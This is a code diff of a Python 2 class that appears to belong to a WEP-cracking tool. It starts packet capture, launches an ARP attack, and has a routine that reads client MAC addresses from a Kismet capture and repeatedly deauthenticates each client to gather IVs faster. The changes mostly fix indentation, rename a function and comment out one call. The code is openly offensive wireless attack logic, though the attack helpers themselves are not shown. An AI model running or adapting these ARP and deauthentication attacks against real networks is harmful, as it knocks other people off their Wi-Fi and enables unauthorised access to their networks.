@@ -59,31 +59,31 @@ class WEPListening():
     def startListening(self):
         print "Starting... %s" % (self.box)
         self.focus_listen_pid = network_listening(self.box)
-		keep_alive_packet(self.box)
+        keep_alive_packet(self.box)
         self.arp_pid = arp_attack(self.box)
-		self.speed_up_process(self.box)
+        #<self.speed_up_process(self.box)
 
-	""" forte probabilité de necessite de debugger ce code
-		process de deauthentification pour accelerer l'obtiention d'iv
-	"""
+    """ forte probabilit� de necessite de debugger ce code
+        process de deauthentification pour accelerer l'obtiention d'iv
+    """
     def speed_up_process(self, box):
-		print "Starting deauthentification_attack ... %s" % (self.box)
-		tab_client = []
-		dir_name = "TestBox"
-		nom_ecoute = "record"
-		path = dir_name + "/" + box._ESSID
-		nom_fichier_xml_ecoute_local = path + "/" + nom_ecoute + "-01.kismet.netxml"
-		sub_tree = ET.parse(nom_fichier_xml_ecoute_local)
-		sub_root = sub_tree.getroot()
-		for child in sub_root:
-			for c_tmp in child.findall('wireless-client'):
-			mac_client = c_tmp.find('client-mac').text
-			client = client_wifi(mac_client)
-			tab_client.append(client)
-		for i in xrange(10) :
-			for client in tab_client :
-			deauthentification_attack(self.box, client)
-			time.sleep(5)
+        print "Starting deauthentification_attack ... %s" % (self.box)
+        tab_client = []
+        dir_name = "TestBox"
+        nom_ecoute = "record"
+        path = dir_name + "/" + box._ESSID
+        nom_fichier_xml_ecoute_local = path + "/" + nom_ecoute + "-01.kismet.netxml"
+        sub_tree = ET.parse(nom_fichier_xml_ecoute_local)
+        sub_root = sub_tree.getroot()
+        for child in sub_root:
+            for c_tmp in child.findall('wireless-client'):
+                mac_client = c_tmp.find('client-mac').text
+                client = client_wifi(mac_client)
+                tab_client.append(client)
+        for i in xrange(10) :
+            for client in tab_client:
+                deauthentication_attack(self.box, client)
+                time.sleep(5)
 
     def stopListening(self):
         print "Stoping... %s" % (self.box)
